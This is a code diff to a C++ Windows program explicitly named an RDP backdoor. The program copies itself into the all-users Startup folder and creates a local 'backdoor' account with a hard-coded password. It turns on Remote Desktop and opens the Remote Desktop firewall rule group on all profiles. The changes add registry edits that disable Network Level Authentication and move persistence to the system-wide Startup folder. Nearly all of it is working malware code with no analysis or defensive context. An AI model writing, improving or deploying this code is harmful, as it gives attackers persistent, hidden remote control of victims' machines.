@@ -5,40 +5,40 @@
 #include <iostream>
 #include <string>
 
-// Linker Pragmas - Resolves all external symbol dependencies internally
-#pragma comment(lib, "netapi32.lib") // For NetUserAdd and NetLocalGroupAddMembers
-#pragma comment(lib, "advapi32.lib") // For Registry manipulation APIs
-#pragma comment(lib, "shell32.lib")  // For SHGetFolderPathW
-#pragma comment(lib, "ole32.lib")    // For COM Initialization (CoInitializeEx)
-#pragma comment(lib, "oleaut32.lib") // For COM BSTR Management (SysAllocString/SysFreeString)
+// Linker Pragmas
+#pragma comment(lib, "netapi32.lib")
+#pragma comment(lib, "advapi32.lib")
+#pragma comment(lib, "shell32.lib")
+#pragma comment(lib, "ole32.lib")
+#pragma comment(lib, "oleaut32.lib")
 
 // Configuration Constants
 const wchar_t *TARGET_EXE_NAME = L"A06_5_RDP_backdoor.exe";
 const wchar_t *BACKDOOR_USER = L"backdoor";
 const wchar_t *BACKDOOR_PASS = L"P@ssw0rd123!";
 
-// Helper function to check if running from the Startup Folder
-bool IsRunningFromStartup(const std::wstring &currentPath, const std::wstring &startupDir)
+// Helper function to check if running from the System Startup Folder
+bool IsRunningFromSystemStartup(const std::wstring &currentPath, const std::wstring &startupDir)
 {
     return currentPath.find(startupDir) != std::wstring::npos;
 }
 
-// Phase 1: Self-Installation to the User-Specific Startup Folder
-bool InstallToStartupFolder()
+// Phase 1: Self-Installation to the System-Wide (All Users) Startup Folder
+bool InstallToSystemStartupFolder()
 {
     wchar_t currentPath[MAX_PATH];
-    wchar_t startupPath[MAX_PATH];
+    wchar_t systemStartupPath[MAX_PATH];
 
     GetModuleFileNameW(NULL, currentPath, MAX_PATH);
 
-    // Retrieve the current user's roaming AppData Startup folder dynamically
-    if (SHGetFolderPathW(NULL, CSIDL_STARTUP, NULL, 0, startupPath) == S_OK)
+    // CSIDL_COMMON_STARTUP targets: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
+    if (SHGetFolderPathW(NULL, CSIDL_COMMON_STARTUP, NULL, 0, systemStartupPath) == S_OK)
     {
-        std::wstring targetPath = std::wstring(startupPath) + L"\\" + TARGET_EXE_NAME;
+        std::wstring targetPath = std::wstring(systemStartupPath) + L"\\" + TARGET_EXE_NAME;
 
-        if (!IsRunningFromStartup(currentPath, startupPath))
+        if (!IsRunningFromSystemStartup(currentPath, systemStartupPath))
         {
-            // Copy binary to persistence location
+            // Copy binary to the global persistence location
             if (CopyFileW(currentPath, targetPath.c_str(), FALSE))
             {
                 return true; // Successfully installed
@@ -48,7 +48,7 @@ bool InstallToStartupFolder()
     return false;
 }
 
-// Phase 2: Native Account Creation, RDP Configuration, and Firewall Modification
+// Phase 2: Native Account Creation, RDP Configuration, NLA Disabling, and Firewall Modification
 bool ConfigureRDPBackdoor()
 {
     USER_INFO_1 ui;
@@ -95,7 +95,16 @@ bool ConfigureRDPBackdoor()
         RegCloseKey(hKey);
     }
 
-    // 5. Natively Enable the "Remote Desktop" Firewall Rule Group via COM
+    // 5. Explicitly Disable Network Level Authentication (NLA) to ensure FreeRDP connects cleanly
+    const wchar_t *rdpTcpPath = L"SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp";
+    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, rdpTcpPath, 0, KEY_WRITE, &hKey) == ERROR_SUCCESS)
+    {
+        DWORD dwUserAuthentication = 0; // 0 = Disable NLA requirement
+        RegSetValueExW(hKey, L"UserAuthentication", 0, REG_DWORD, (const BYTE *)&dwUserAuthentication, sizeof(dwUserAuthentication));
+        RegCloseKey(hKey);
+    }
+
+    // 6. Natively Enable the "Remote Desktop" Firewall Rule Group via COM
     HRESULT hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
     if (SUCCEEDED(hr) || hr == RPC_E_CHANGED_MODE)
     {
@@ -110,10 +119,7 @@ bool ConfigureRDPBackdoor()
         if (SUCCEEDED(hr))
         {
             BSTR groupName = SysAllocString(L"Remote Desktop");
-
-            // Set Enable to TRUE for the entire localized rule group across all profiles
             pNetFwPolicy2->EnableRuleGroup(NET_FW_PROFILE2_ALL, groupName, VARIANT_TRUE);
-
             SysFreeString(groupName);
             pNetFwPolicy2->Release();
         }
@@ -123,24 +129,24 @@ bool ConfigureRDPBackdoor()
     return true;
 }
 
-// Application Entry Point (Windows Subsystem avoids flashing console frames)
+// Application Entry Point
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
 {
     wchar_t currentPath[MAX_PATH];
-    wchar_t startupPath[MAX_PATH];
+    wchar_t systemStartupPath[MAX_PATH];
 
     GetModuleFileNameW(NULL, currentPath, MAX_PATH);
-    SHGetFolderPathW(NULL, CSIDL_STARTUP, NULL, 0, startupPath);
+    SHGetFolderPathW(NULL, CSIDL_COMMON_STARTUP, NULL, 0, systemStartupPath);
 
     // Context Evaluation
-    if (!IsRunningFromStartup(currentPath, startupPath))
+    if (!IsRunningFromSystemStartup(currentPath, systemStartupPath))
     {
-        // Step 1: Execute installation flow if running from a staging directory
-        InstallToStartupFolder();
+        // Step 1: Execute staging copy to C:\ProgramData\...\Startup (Requires Admin context once to drop)
+        InstallToSystemStartupFolder();
     }
     else
     {
-        // Step 2: Running from persistence trigger context; enforce configuration modifications
+        // Step 2: Running from global persistence trigger; run account and network configuration
         ConfigureRDPBackdoor();
     }
 
